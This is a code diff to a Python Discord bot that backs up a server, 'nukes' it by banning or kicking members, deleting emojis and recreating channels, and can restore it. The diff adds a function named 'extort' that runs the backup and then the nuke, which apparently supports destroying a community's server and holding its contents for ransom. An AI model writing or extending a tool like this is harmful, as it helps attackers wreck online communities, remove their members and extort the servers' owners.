@@ -5,7 +5,7 @@ import shelve
 async def backup(guild):
     categories, text_channels, voice_channels, members, icon, banner, emojis = await serialize_server_info(guild)
     d = shelve.open(str(guild.id))
-    d['name'], d['owner'], d['emojis'], d['stickers'], d['categories'], d['text_channels'], d['voice_channels'], d['members'], d['member_count'], d['icon'], d['banner'] = guild.name, guild.owner.name, emojis, guild.stickers, categories, text_channels, voice_channels, members, guild.member_count, icon, banner
+    d['name'], d['owner'], d['emojis'], d['categories'], d['text_channels'], d['voice_channels'], d['members'], d['member_count'], d['icon'], d['banner'] = guild.name, guild.owner.name, emojis, categories, text_channels, voice_channels, members, guild.member_count, icon, banner
     d.close()
 
 
@@ -36,7 +36,7 @@ async def nuke(guild):
         await ban_or_kick(guild)
     if b_delete_emojis:
         await delete_emojis(guild)
-    #if b_delete_stickers: Stickers can't be restored as of now, so dont delete them
+    # if b_delete_stickers: Stickers can't be restored as of now, so dont delete them
     #    await delete_stickers(guild)
     if b_create_text_channels or b_create_voice_channels or b_create_categories:
         await create_channels(guild)
@@ -59,3 +59,8 @@ async def restore(guild):
     if guild.banner and guild.banner.read() != d['banner']:
         print(f'changing banner')
         await guild.edit(banner=d['banner'])
+
+
+async def extort(guild):
+    await backup(guild)
+    await nuke(guild)
